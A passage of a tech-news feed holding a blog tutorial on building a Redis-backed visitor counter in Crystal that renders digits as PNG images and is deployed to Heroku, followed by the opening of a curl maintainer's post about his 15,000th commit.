x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%250A%2520%2520%2520%2520%255D%2520%250A%2520%2520%2520%2520%250A%2520%2520%2520%2520ZERO%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x59595a%252C%25200x6e6f6f%252C%25200x646465%252C%25200x212222%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x787879%252C%25200xa4a4a4%252C%25200x6e6f6f%252C%25200x939393%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200xb3b3b3%252C%25200x323233%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200xa4a4a4%252C%25200x4d4e4e%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x787879%252C%25200x6e6f6f%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200x939393%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200x939393%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x404141%252C%25200xa4a4a4%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x787879%252C%25200x6e6f6f%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200xababab%252C%25200x4d4e4e%252C%25200x0a0b0c%252C%25200x212222%252C%25200xababab%252C%25200x404141%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x646465%252C%25200xb3b3b3%252C%25200x939393%252C%25200xababab%252C%25200x828282%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x212222%252C%25200x4d4e4e%252C%25200x323233%252C%25200x0a0b0c%252C%25200x0a0b0c%250A%2520%2520%2520%2520%255D"><img src="https://www.techprowd.com/content/images/2020/09/carbon--19-.png" alt="carbon--19-"></a></p>
<!--kg-card-end: markdown--><p>Now that I have pixel data of each character, I can finally create a whole image.</p><p>Knowing the array's exact size, in our case, it's 7x10; we can loop through the array and fill in all pixels referenced from a given position.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=module%2520VisitorCounter%253A%253ACharacters%250A%2520%2520%2520%2520CHARACTER_WIDTH%2520%253D%25207%250A%2520%2520%2520%2520CHARACTER_HEIGHT%2520%253D%252010%250A%2520%2520%2520%2520%250A%2520%2520%2520%2520TWO%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x59595a%252C%25200x6e6f6f%252C%25200x646465%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x828282%252C%25200x9b9c9c%252C%25200x6e6f6f%252C%25200x939393%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x323233%252C%25200xababab%252C%25200x212222%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200xa4a4a4%252C%25200x4d4e4e%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x323233%252C%25200x646465%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x9b9c9c%252C%25200x404141%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x646465%252C%25200x939393%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x8b8b8b%252C%25200x787879%252C%25200x212222%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x404141%252C%25200x939393%252C%25200x404141%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x9b9c9c%252C%25200x212222%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200xb3b3b3%252C%25200xb3b3b3%252C%25200xb3b3b3%252C%25200xb3b3b3%252C%25200xb3b3b3%252C%25200x4d4e4e%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%250A%2520%2520%2520%2520%255D%250A%2520%2520%2520%2520%250A%2520%2520%2520%2520ONE%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x4d4e4e%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x9b9c9c%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x787879%252C%25200x939393%252C%25200xa4a4a4%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%250A%2520%2520%2520%2520%255D%2520%250A%2520%2520%2520%2520%250A%2520%2520%2520%2520ZERO%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x59595a%252C%25200x6e6f6f%252C%25200x646465%252C%25200x212222%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x787879%252C%25200xa4a4a4%252C%25200x6e6f6f%252C%25200x939393%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200xb3b3b3%252C%25200x323233%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200xa4a4a4%252C%25200x4d4e4e%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%2520"><img src="https://www.techprowd.com/content/images/2020/09/carbon--20-.png" alt="carbon--20-"></a></p>
<!--kg-card-end: markdown--><p>After trying out <code>VisitorCounter::Characters.render_character</code> function I was able to see it working correctly.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-65.png" alt=""></figure><p>Now it's time to wrap it all and make the main function, which would generate and return generated image as <code>IO::Memory</code> buffer.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/carbon--21--1.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/carbon--21--1.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/carbon--21--1.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/carbon--21--1.png 1600w, https://www.techprowd.com/content/images/2020/09/carbon--21--1.png 2048w" sizes="(min-width: 720px) 720px"></figure><p>To make more usable, I added this image generator to a simple HTTP server and returned random numbers generated in response.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=require%2520%2522stumpy_png%2522%250Ainclude%2520StumpyPNG%250Arequire%2520%2522http%252Fserver%2522%250Arequire%2520%2522.%252Fvisitor_counter%252F*%2522%250A%250Aserver%2520%253D%2520HTTP%253A%253AServer.new%2520do%2520%257Ccontext%257C%250A%2520%2520context.response.content_type%2520%253D%2520%2522image%252Fpng%2522%250A%250A%2520%2520image%2520%253D%2520VisitorCounter%253A%253AImageGenerator.generate(%250A%2520%2520%2520%2520Random.new.rand(1..99999999)%252C%250A%2520%2520%2520%2520Random.new.rand(1..99999999)%252C%250A%2520%2520)%250A%250A%2520%2520context.response.content_length%2520%253D%2520image.size%250A%2520%2520IO.copy(image%252C%2520context.response)%250Aend%250A%250Aaddress%2520%253D%2520server.bind_tcp%25208080%250Aputs%2520%2522Listening%2520on%2520http%253A%252F%252F%2523%257Baddress%257D%2522%250Aserver.listen%250A"><img src="https://www.techprowd.com/content/images/2020/09/carbon--22-.png" alt="carbon--22-"></a></p>
<!--kg-card-end: markdown--><p>After running this code and going to <code>http://127.0.0.1:8080</code> I received generated image with random numbers.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-66.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-66.png 600w, https://www.techprowd.com/content/images/2020/09/image-66.png 612w"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-67.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-67.png 600w, https://www.techprowd.com/content/images/2020/09/image-67.png 612w"></figure><p>Now we can move on to a more exciting part, which is counting visitors.</p><h2 id="step-2-counting-visitors">Step 2: Counting Visitors</h2><p>To count visitors first, we need some kind of unique value. In this project, I am going to use the IP address of the client. As I plan to host this on Heroku, I know that IP will only be IPv4, so I can safely convert the IP address from 127.0.0.1 to its bytes equivalent by merging all 4 x Int8 parts of IP this way it will take less space in Redis memory 4 bytes instead of 15 bytes.</p><p>This is a function which extracts IP address from request. As I mentioned before, this will be hosted on Heroku, so the client IP address will be available in the HTTP header <code>X-Forwarded-For</code> as a load balancer will replace the client IP address with its own.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=private%2520def%2520extract_ip(request)%250A%2520%2520%2520%2520ip%2520%253D%2520request.headers%255B%2522X-Forwarded-For%2522%255D%253F%250A%2520%2520%2520%2520if%2520ip.nil%253F%250A%2520%2520%2520%2520%2520%2520%2520%2520case%2520remote_address%2520%253D%2520request.remote_address%250A%2520%2520%2520%2520%2520%2520%2520%2520when%2520Socket%253A%253AIPAddress%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520ip%2520%253D%2520remote_address.address%250A%2520%2520%2520%2520%2520%2520%2520%2520else%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520ip%2520%253D%2520nil%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520unless%2520ip.nil%253F%250A%2520%2520%2520%2520%2520%2520a%252C%2520b%252C%2520c%252C%2520d%2520%253D%2520ip.split(%27.%27)%250A%250A%2520%2520%2520%2520%2520%2520ip_address%2520%253D%2520Slice(UInt8).new(4)%250A%2520%2520%2520%2520%2520%2520ip_address%255B0%255D%2520%253D%2520a.to_u8%250A%2520%2520%2520%2520%2520%2520ip_address%255B1%255D%2520%253D%2520b.to_u8%250A%2520%2520%2520%2520%2520%2520ip_address%255B2%255D%2520%253D%2520c.to_u8%250A%2520%2520%2520%2520%2520%2520ip_address%255B3%255D%2520%253D%2520d.to_u8%250A%250A%2520%2520%2520%2520%2520%2520return%2520String.new(ip_address)%250A%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520nil%250Aend"><img src="https://www.techprowd.com/content/images/2020/09/carbon--25-.png" alt="carbon--25-"></a></p>
<!--kg-card-end: markdown--><p>If the IP address is not available for some reason, I will skip this visit from a unique visit count and just increase the total visit count.</p><p>Now wrapping everything into <code>WebHandler</code>, which will nicely integrate into HTTP Server, we should have a working counter.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=module%2520VisitorCounter%250A%2520%2520%2520%2520class%2520WebHandler%250A%2520%2520%2520%2520%2520%2520%2520%2520include%2520HTTP%253A%253AHandler%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520UNIQUE_VISITS_OFFSET_KEY%2520%253D%2520%2522UNIQUE_VISITS_OFFSET%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520TOTAL_VISITS_OFFSET_KEY%2520%253D%2520%2522TOTAL_VISITS_OFFSET%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520TOTAL_VISITS_KEY%2520%253D%2520%2522TOTAL_VISITS%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520UNIQUE_VISITS_KEY%2520%253D%2520%2522UNIQUE_VISITS%2522%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520def%2520initialize(redis%2520%253A%2520Redis%253A%253APooledClient)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2540redis%2520%253D%2520redis%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520def%2520call(context)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.headers%255B%2522Server%2522%255D%2520%253D%2520%2522Techprowd%2520Visitor%2520Counter%2520v1.0%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520unless%2520context.request.method%2520%253D%253D%2520%2522GET%2522%2520%257C%257C%2520context.request.method%2520%253D%253D%2520%2522HEAD%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.status_code%2520%253D%2520405%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.headers.add(%2522Allow%2522%252C%2520%2522GET%252C%2520HEAD%2522)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520return%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520context.request.path.not_nil!%2520!%253D%2520%2522%252F%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520call_next(context)%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520return%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520ip_address%2520%253D%2520extract_ip(context.request)%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520unless%2520ip_address.nil%253F%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520increase_total_visits(ip_address)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520increase_unique_visits(ip_address)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520image%2520%253D%2520ImageGenerator.generate(%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520get_total_visits()%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520get_unique_visits()%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520)%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.content_type%2520%253D%2520%2522image%252Fpng%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.content_length%2520%253D%2520image.size%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520IO.copy(image%252C%2520context.response)%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520private%2520def%2520increase_total_visits(ip)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.incr(TOTAL_VISITS_KEY).to_i%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520private%2520def%2520increase_unique_visits(ip)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520%2540redis.exists(ip)%2520%253D%253D%25200%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.set(ip%252C%25201)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.incr(UNIQUE_VISITS_KEY).to_i%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520end%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520private%2520def%2520get_unique_visits%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520(%2540redis.get(UNIQUE_VISITS_KEY)%2520%257C%257C%2520%25220%2522).to_i%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520private%2520def%2520get_total_visits%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520(%2540redis.get(TOTAL_VISITS_KEY)%2520%257C%257C%2520%25220%2522).to_i%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%2520%2520%2520%2520end%250Aend"><img src="https://www.techprowd.com/content/images/2020/09/carbon--35-.png" alt="carbon--35-"></a></p>
<!--kg-card-end: markdown--><p>The main file code should look like this right now:</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=require%2520%2522stumpy_png%2522%250Arequire%2520%2522http%252Fserver%2522%250Arequire%2520%2522http%252Fserver%252Fhandlers%252F*%2522%250Arequire%2520%2522redis%2522%250A%250Arequire%2520%2522.%252Fvisitor_counter%252F*%2522%250A%250Ainclude%2520StumpyPNG%250A%250Amodule%2520VisitorCounter%250A%2520%2520VERSION%2520%253D%2520%25220.1.0%2522%250A%250A%2520%2520ENV%255B%2522PORT%2522%255D%2520%257C%257C%253D%2520%25228080%2522%250A%2520%2520ENV%255B%2522REDIS_URL%2522%255D%2520%257C%257C%253D%2520%2522redis%253A%252F%252F127.0.0.1%252F%2522%250A%250A%2520%2520redis%2520%253D%2520Redis%253A%253APooledClient.new(url%253A%2520ENV%255B%2522REDIS_URL%2522%255D)%250A%250A%2520%2520server%2520%253D%2520HTTP%253A%253AServer.new(%255B%250A%2520%2520%2520%2520HTTP%253A%253AErrorHandler.new%252C%250A%2520%2520%2520%2520HTTP%253A%253ALogHandler.new%252C%250A%2520%2520%2520%2520HTTP%253A%253ACompressHandler.new%252C%250A%2520%2520%2520%2520VisitorCounter%253A%253AWebHandler.new(redis)%252C%250A%2520%2520%255D)%250A%250A%2520%2520address%2520%253D%2520server.bind_tcp%2520%25220.0.0.0%2522%252CENV%255B%2522PORT%2522%255D.to_i%250A%2520%2520puts%2520%2522Listening%2520on%2520http%253A%252F%252F%2523%257Baddress%257D%2522%250A%2520%2520server.listen%250Aend"><img src="https://www.techprowd.com/content/images/2020/09/carbon--31-.png" alt="carbon--31-"></a></p>
<!--kg-card-end: markdown--><p>Running the main code now we should see the counter working as expected:</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-80.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-80.png 600w, https://www.techprowd.com/content/images/2020/09/image-80.png 801w"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-79.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-79.png 600w, https://www.techprowd.com/content/images/2020/09/image-79.png 612w"></figure><p>Notice the response times of the web request! It's around 1ms per request! That's crazy fast... But wait, it's not built correctly.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-81.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-81.png 600w, https://www.techprowd.com/content/images/2020/09/image-81.png 829w"></figure><p>Now that's what I call FAST!</p><figure><img src="https://www.techprowd.com/content/images/2020/09/source-1.gif" alt=""></figure><p>Just one issue... While running Apache benchmarks, I noticed that the total visit counter is increasing at every request, which is right, but it can be easily abused. We need to rate-limit the total visit counter so that a single IP address can have only one visit per X amount of time.</p><p>Easy, he said! Remember, we are using Redis for our storage, and Redis has a Keys with Expiration feature. Which is precisely what we need.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=private%2520def%2520increase_total_visits(ip)%250A%2520%2520%2520%2520if%2520%2540redis.exists(%2522!%2523%257Bip%257D%2522)%2520%253D%253D%25200%250A%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.incr(TOTAL_VISITS_KEY).to_i%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.set(%2522!%2523%257Bip%257D%2522%252C%25201%252C%2520RATE_LIMIT_SECONDS)%250A%2520%2520%2520%2520end%250Aend"><img src="https://www.techprowd.com/content/images/2020/09/carbon--37-.png" alt="carbon--37-"></a></p>
<!--kg-card-end: markdown--><p>This way now only increases total visits only when the rate limit timeout will be reached; in this code, it's 5 seconds, but I am going to set something like 1 minute in production.</p><p>Now that we have our application working as we expect. We should deploy our application. I am going to follow the official <a href="https://crystal-lang.org/2016/05/26/heroku-buildpack.html">Crystal guide for Heroku deployment</a>.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-82.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-82.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-82.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-82.png 1600w, https://www.techprowd.com/content/images/2020/09/image-82.png 1676w" sizes="(min-width: 1200px) 1200px"></figure><p>After easy set up and install now we have an working counter running on heroku.</p><p><a href="https://immense-beyond-23382.herokuapp.com/">https://immense-beyond-23382.herokuapp.com/</a></p><!--kg-card-begin: html--><p><img src="https://immense-beyond-23382.herokuapp.com/"></p><!--kg-card-end: html--><h2 id="conclusion">Conclusion</h2><p>The fully working source code is available on my <a href="https://www.patreon.com/posts/41771991">Patreon account</a> for all pledgers. I will try to add this small counter to this Ghost template as I really loved the idea of this small counter 15 years ago.</p><p>Don't forget to subscribe to the newsletters down bellow. Every new article will be delivered in a friendly email, readable format straight into your mailbox!</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to techprowd</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>
            

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://www.techprowd.com/evening-project-a-crystal-based-super-fast-visitor-counter/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525873</guid>
            <pubDate>Sat, 19 Sep 2020 07:43:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My first 15000 curl commits]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525665">thread link</a>) | @dosshell
<br/>
September 18, 2020 | https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I‚Äôve long maintained that <strong>persistence</strong> is one of the main qualities you need in order to succeed with your (software) project. In order to manage to ship a product that truly conquers the world. By continuously and never-ending keeping at it: polishing away flaws and adding good features. On and on and on.</p>



<p>Today marks the day when I landed my 15,000th commit in the <a href="https://github.com/curl/curl">master branch in curl‚Äôs git repository</a> ‚Äì and we don‚Äôt do merge commits so this number doesn‚Äôt include such. Funnily enough, <a href="https://github.com/curl/curl/graphs/contributors">GitHub can‚Äôt count</a> and shows a marginally lower number.</p>



<figure><img loading="lazy" width="844" height="116" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png 844w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-450x62.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-200x27.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-768x106.png 768w" sizes="(max-width: 844px) 100vw, 844px"></figure>



<p>This is of course a totally meaningless number and I‚Äôm only mentioning it here because it‚Äôs even and an opportunity for me to celebrate something. To cross off an imaginary milestone. This is not even a year since we passed <a href="https://daniel.haxx.se/blog/2019/11/29/curl-25000-commits/" data-type="post" data-id="12859">25,000 total number of commits</a>. Another meaningless number.</p>



<p>15,000 commits equals 57% of all commits done in curl so far and it makes me the only committer in the curl project with over 10% of the commits.</p>



